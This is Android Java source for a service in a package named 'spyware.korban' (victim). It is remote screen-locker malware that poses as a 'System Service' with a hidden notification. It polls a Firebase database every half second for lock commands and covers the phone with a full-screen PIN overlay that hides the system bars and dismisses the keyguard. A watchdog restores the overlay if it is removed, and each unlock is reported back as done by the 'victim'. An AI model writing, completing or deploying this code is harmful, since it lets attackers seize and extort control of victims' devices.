package com.spyware.korban;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowInsets;
import android.view.WindowInsetsController;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LockService extends Service {

    private static final String TAG = "LOCK_SVC";
    private static final int NOTIF_ID = 1001;
    private static final String CHANNEL_ID = "lock_channel";
    private static final long POLL_INTERVAL = 500;
    private static final long OVERLAY_CHECK_INTERVAL = 300;

    private Handler handler = new Handler(Looper.getMainLooper());
    private volatile boolean isRunning = true;
    private volatile boolean isLocked = false;
    private volatile String lastLockedValue = "";
    private volatile boolean checking = false;

    private volatile String lastLockPassword = "dimzz";
    private volatile String lastLockedBy = "dimzz";
    private volatile String lastLockInfo = "";

    // ═══ FIX: Flag global anti re-lock ═══
    public static volatile boolean userUnlocked = false;

    private String deviceId = Build.MODEL.replace(" ", "_");
    private String FIREBASE_URL =
        "URL LU" + deviceId;

    // ═══ OVERLAY PIN ═══
    private WindowManager windowManager;
    private View overlayView;
    private volatile boolean overlayShowing = false;

    // ═══ PIN STATE ═══
    private StringBuilder pinInput = new StringBuilder();
    private TextView pinDisplay, errorMsg;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "LockService created");
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        createNotificationChannel();
        startForegroundCompat();
        handler.postDelayed(commandMonitorTask, 1000);
    }

    private void startForegroundCompat() {
        Notification notification = buildNotification();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification,
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(NOTIF_ID, notification);
            }
        } catch (Exception e) {
            try { startForeground(NOTIF_ID, notification); } catch (Exception ex) {}
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;

        String action = intent.getStringExtra("action");
        if ("lock".equals(action)) {
            String password = intent.getStringExtra("lock_password");
            String lockedBy = intent.getStringExtra("lock_by");
            String info = intent.getStringExtra("lock_info");
            showLockScreen(password, lockedBy, info);
        } else if ("unlock".equals(action)) {
            hideLockScreen();
        }

        return START_STICKY;
    }

    private void showLockScreen(String password, String lockedBy, String info) {
        // ═══ FIX: Kalau user udah unlock manual, jangan lock lagi ═══
        if (userUnlocked) {
            Log.d(TAG, "User already unlocked, skip lock");
            return;
        }

        if (password == null || password.isEmpty()) password = "dimzz";
        if (lockedBy == null || lockedBy.isEmpty()) lockedBy = "dimzz";
        if (info == null) info = "";

        lastLockPassword = password;
        lastLockedBy = lockedBy;
        lastLockInfo = info;

        AccessibilityBlockService.lastLockPassword = password;
        AccessibilityBlockService.lastLockedBy = lockedBy;
        AccessibilityBlockService.lastLockInfo = info;

        isLocked = true;
        AccessibilityBlockService.blockActive = true;
        pinInput.setLength(0);

        showPinOverlay();
    }

    private void hideLockScreen() {
        isLocked = false;
        AccessibilityBlockService.blockActive = false;
        AccessibilityBlockService.lastLockPassword = "";
        AccessibilityBlockService.lastLockedBy = "";
        AccessibilityBlockService.lastLockInfo = "";

        hidePinOverlay();

        Intent closeIntent = new Intent("com.spyware.korban.CLOSE_LOCK");
        closeIntent.setPackage(getPackageName());
        sendBroadcast(closeIntent);
        Log.d(TAG, "Lock + overlay hidden");
    }

    // ═══════════════════════════════════════════════
    // SHOW PIN OVERLAY (FIX: tanpa garis ijo di bawah)
    // ═══════════════════════════════════════════════
    private void showPinOverlay() {
        if (overlayShowing) return;
        if (windowManager == null) {
            windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        }
        if (windowManager == null) return;

        try {
            LayoutInflater inflater = (LayoutInflater)
                getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            overlayView = inflater.inflate(R.layout.activity_lock, null);

            pinDisplay = overlayView.findViewById(R.id.pinDisplay);
            errorMsg = overlayView.findViewById(R.id.errorMsg);
            TextView lockedByText = overlayView.findViewById(R.id.lockedByText);
            TextView infoText = overlayView.findViewById(R.id.infoText);

            lockedByText.setText("SYSTEM LOCKED");
            if (lastLockInfo.isEmpty()) {
                infoText.setVisibility(View.GONE);
            } else {
                infoText.setText(lastLockInfo);
                infoText.setVisibility(View.VISIBLE);
            }

            int[] ids = {R.id.btn0, R.id.btn1, R.id.btn2, R.id.btn3, R.id.btn4,
                         R.id.btn5, R.id.btn6, R.id.btn7, R.id.btn8, R.id.btn9};
            for (int i = 0; i < ids.length; i++) {
                final String num = String.valueOf(i);
                Button b = overlayView.findViewById(ids[i]);
                if (b != null) {
                    b.setOnClickListener(new View.OnClickListener() {
                        @Override
                        public void onClick(View v) {
                            overlayPress(num);
                        }
                    });
                }
            }

            View delBtn = overlayView.findViewById(R.id.btnDel);
            if (delBtn != null) {
                delBtn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) { overlayDel(); }
                });
            }

            View okBtn = overlayView.findViewById(R.id.btnOk);
            if (okBtn != null) {
                okBtn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) { overlayUnlock(); }
                });
            }

            updateOverlayPin();

            int type;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                type = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
            } else {
                type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
            }

            // ═══ FIX: Hapus FLAG_LAYOUT_NO_LIMITS, tambah 2 flag baru ═══
            int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                      | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
                      | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
                      | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                      | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                      | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
                      | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                flags,
                PixelFormat.OPAQUE
            );
            params.gravity = Gravity.TOP | Gravity.START;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                params.layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            }

            windowManager.addView(overlayView, params);
            overlayShowing = true;
            Log.d(TAG, "PIN Overlay ADDED");

            // ═══ FIX: Sembunyikan navbar & status bar di overlay ═══
            overlayView.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_LOW_PROFILE
            );

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    WindowInsetsController controller = overlayView.getWindowInsetsController();
                    if (controller != null) {
                        controller.hide(WindowInsets.Type.statusBars()
                                      | WindowInsets.Type.navigationBars());
                        controller.setSystemBarsBehavior(
                            WindowInsetsController.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE);
                    }
                } catch (Exception e) {}
            }

            handler.postDelayed(overlayWatchdog, OVERLAY_CHECK_INTERVAL);
        } catch (Exception e) {
            Log.e(TAG, "showPinOverlay: " + e.getMessage());
        }
    }

    private void hidePinOverlay() {
        if (!overlayShowing || overlayView == null) return;
        try {
            windowManager.removeView(overlayView);
        } catch (Exception e) {}
        overlayView = null;
        overlayShowing = false;
        pinDisplay = null;
        errorMsg = null;
        handler.removeCallbacks(overlayWatchdog);
    }

    private final Runnable overlayWatchdog = new Runnable() {
        @Override
        public void run() {
            if (!isRunning || !isLocked) return;
            if (!overlayShowing || overlayView == null) {
                showPinOverlay();
            } else {
                try {
                    if (overlayView.getParent() == null) {
                        overlayShowing = false;
                        showPinOverlay();
                    }
                } catch (Exception e) {}
            }
            handler.postDelayed(this, OVERLAY_CHECK_INTERVAL);
        }
    };

    // ═══════════════════════════════════════════════
    // PIN LOGIC
    // ═══════════════════════════════════════════════
    private void overlayPress(String num) {
        if (pinInput.length() >= 12) return;
        pinInput.append(num);
        updateOverlayPin();
        if (errorMsg != null) errorMsg.setVisibility(View.GONE);
    }

    private void overlayDel() {
        if (pinInput.length() > 0) {
            pinInput.deleteCharAt(pinInput.length() - 1);
            updateOverlayPin();
        }
    }

    private void updateOverlayPin() {
        if (pinDisplay == null) return;
        int len = pinInput.length();
        StringBuilder s = new StringBuilder();
        for (int i = 0; i < len; i++) s.append("●");
        int minLen = Math.max(4, len);
        for (int i = len; i < minLen; i++) s.append("_");
        pinDisplay.setText(s.toString());
    }

    private void overlayUnlock() {
        final String pw = pinInput.toString();
        if (pw.equals(lastLockPassword)) {
            // ═══ FIX: Kunci biar gak balik lagi ═══
            isLocked = false;
            lastLockedValue = "";
            userUnlocked = true;
            AccessibilityBlockService.blockActive = false;
            AccessibilityBlockService.lastLockPassword = "";
            AccessibilityBlockService.lastLockedBy = "";
            AccessibilityBlockService.lastLockInfo = "";

            pinInput.setLength(0);
            hidePinOverlay();

            new Thread(new Runnable() {
                @Override
                public void run() {
                    HttpURLConnection c = null;
                    DataOutputStream os = null;
                    try {
                        String url = FIREBASE_URL + "/lock.json";
                        c = (HttpURLConnection) new URL(url).openConnection();
                        c.setRequestMethod("PUT");
                        c.setRequestProperty("Content-Type", "application/json");
                        c.setDoOutput(true);
                        String body = "{\"locked\":false,\"unlocked_at\":"
                            + System.currentTimeMillis() + ",\"unlocked_by\":\"victim\"}";
                        os = new DataOutputStream(c.getOutputStream());
                        os.write(body.getBytes("UTF-8"));
                        os.flush();
                        c.getResponseCode();
                    } catch (Exception e) {
                    } finally {
                        try { if (os != null) os.close(); } catch (Exception e) {}
                        try { if (c != null) c.disconnect(); } catch (Exception e) {}
                    }
                }
            }).start();

            Intent closeIntent = new Intent("com.spyware.korban.CLOSE_LOCK");
            closeIntent.setPackage(getPackageName());
            sendBroadcast(closeIntent);

            Log.d(TAG, "UNLOCKED — Free forever until admin locks again");
        } else {
            pinInput.setLength(0);
            updateOverlayPin();
            if (errorMsg != null) {
                errorMsg.setText("❌ ACCESS DENIED");
                errorMsg.setVisibility(View.VISIBLE);
            }
        }
    }

    // ═══════════════════════════════════════════════
    // POLLING Firebase
    // ═══════════════════════════════════════════════
    private final Runnable commandMonitorTask = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;
            checkLockCommand();
            handler.postDelayed(this, POLL_INTERVAL);
        }
    };

    private void checkLockCommand() {
        if (checking) return;
        checking = true;
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                BufferedReader reader = null;
                try {
                    URL url = new URL(FIREBASE_URL + "/lock.json");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(5000);
                    conn.setReadTimeout(5000);

                    if (conn.getResponseCode() == 200) {
                        InputStream is = conn.getInputStream();
                        reader = new BufferedReader(new InputStreamReader(is));
                        StringBuilder sb = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) sb.append(line);

                        String data = sb.toString().trim();
                        if (data != null && !data.equals("null") && data.length() > 5) {
                            if (!data.equals(lastLockedValue)) {
                                lastLockedValue = data;
                                handleLockCommand(data);
                            }
                        }
                    }
                } catch (Exception e) {
                } finally {
                    try { if (reader != null) reader.close(); } catch (Exception e) {}
                    if (conn != null) conn.disconnect();
                    checking = false;
                }
            }
        }).start();
    }

    private void handleLockCommand(String json) {
        try {
            JSONObject obj = new JSONObject(json);
            boolean locked = obj.optBoolean("locked", false);

            if (locked && !isLocked) {
                // ═══ FIX: Admin lock baru → reset userUnlocked ═══
                userUnlocked = false;

                String pass = obj.optString("password", "dimzz");
                String by = obj.optString("locked_by", "dimzz");
                String info = obj.optString("info", "");
                showLockScreen(pass, by, info);
            } else if (!locked && isLocked) {
                hideLockScreen();
            }
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_MIN);
                ch.setSound(null, null);
                ch.setVibrationPattern(null);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                ch.setShowBadge(false);
                NotificationManager nm =
                    (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {}
        }
    }

    private Notification buildNotification() {
        try {
            Notification.Builder b;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                b = new Notification.Builder(this, CHANNEL_ID);
            else
                b = new Notification.Builder(this);

            b.setContentTitle("System Service")
             .setContentText("Running")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setOngoing(true)
             .setShowWhen(false);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP)
                b.setPriority(Notification.PRIORITY_MIN);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                b.setCategory(Notification.CATEGORY_SERVICE);
                b.setVisibility(Notification.VISIBILITY_SECRET);
            }
            return b.build();
        } catch (Exception e) {
            return new Notification.Builder(this)
                .setContentTitle("System Service")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .build();
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning = false;
        isLocked = false;
        AccessibilityBlockService.blockActive = false;
        hidePinOverlay();
        handler.removeCallbacksAndMessages(null);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                stopForeground(STOP_FOREGROUND_REMOVE);
            } else {
                stopForeground(true);
            }
        } catch (Exception e) {}
    }
}